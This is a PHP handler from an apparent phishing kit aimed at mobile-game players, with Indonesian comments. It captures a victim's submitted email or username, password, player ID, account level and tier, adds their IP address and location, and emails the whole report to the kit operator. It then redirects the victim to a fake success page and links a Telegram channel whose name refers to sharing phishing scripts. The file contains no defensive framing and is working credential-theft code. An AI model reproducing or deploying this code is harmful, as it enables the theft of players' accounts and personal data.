<?php 
include 'alxBackEnd/setting.php';
include 'email.php';

// MENANGKAP DATA YANG DI-INPUT
$email = $_POST['email'];
$password = $_POST['password'];
$login = $_POST['login'];
$nick = $_POST['nick'];
$playid = $_POST['playid'];
$zoneid = $_POST['zoneid'];
$level = $_POST['level'];
$tier = $_POST['tier'];
$img = $_POST['img'];

// KONTEN RESULT AKUN
$subjek = "$arpantek_flag | $arpantek_callingcode | PUNYA SI $email | LEVEL $level | LOGIN $login";
$pesan = '
<center> 
<div style="background: url(https://raw.githubusercontent.com/genjehhh1/pabjii/main/banner.png) no-repeat center center; background-size: 100% 100%; width: 294; height: 100px; color: #000; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;"></div>
<div style="background: #000; width: 294; color: #fff; text-align: left; padding: 10px;">Informasi Akun</div>
<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>EMAIL/PHONE/USERNAME</th>
<th style="width: 78%; text-align: center;"><b>'.$email.'</th>
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>PASSWORD</th>
<th style="width: 78%; text-align: center;"><b>'.$password.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>NICKNAME</th>
<th style="width: 78%; text-align: center;"><b>'.$nick.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>PLAYER ID</th>
<th style="width: 78%; text-align: center;"><b>'.$playid.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>ACCOUNT LEVEL</th>
<th style="width: 78%; text-align: center;"><b>'.$level.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>TIER ACCOUNT</th>
<th style="width: 78%; text-align: center;"><b>'.$tier.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>LOGIN</th>
<th style="width: 78%; text-align: center;"><b>'.$login.'</th> 
</tr>
</table>
<div style="background: #000; width: 294; color: #fff; text-align: left; padding: 10px;">Informasi Tambahan</div>
<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>IP ADDRESS</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek_ip_address.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>CONTINENT</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek_continent.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>COUNTRY</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek_country.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>REGION</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek_region.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>CITY</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek_city.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>LOGIN TIME</th>
<th style="width: 78%; text-align: center;"><b>'.$jamasuk.'</th> 
</tr>
</table>
<div style="width: 294; height: 40px; background: #000; color: #fff; padding: 10px; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; text-align: center;">
<a style="background-image: linear-gradient(#179CDE, #0088CC); width: 55%; margin-top: 10px; margin-left: auto; margin-right: auto; padding: 6px; color: #fff; font-size: 15px; text-align: center; text-transform: uppercase; text-decoration: none; border-radius: 3px; outline: none; display: block;" href="https://t.me/berbagiscphisingml">Find Me on Telegram</a>
</div>
</center>
';
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sender.'' . "\r\n";
$send = mail($emailku, $subjek, $pesan, $headers);

// MENDAPATKAN DATA YANG DI-INPUT DAN MENGALIHKAN KE HALAMAN COMPLETED
if($send) {
echo "<form id='arpantek' method='POST' action='success.php'>
<input type='hidden' name='nick' value='$nick'>
<input type='hidden' name='img' value='$img'>
</form>
<script type='text/javascript'>document.getElementById('arpantek').submit();</script>";
}
?>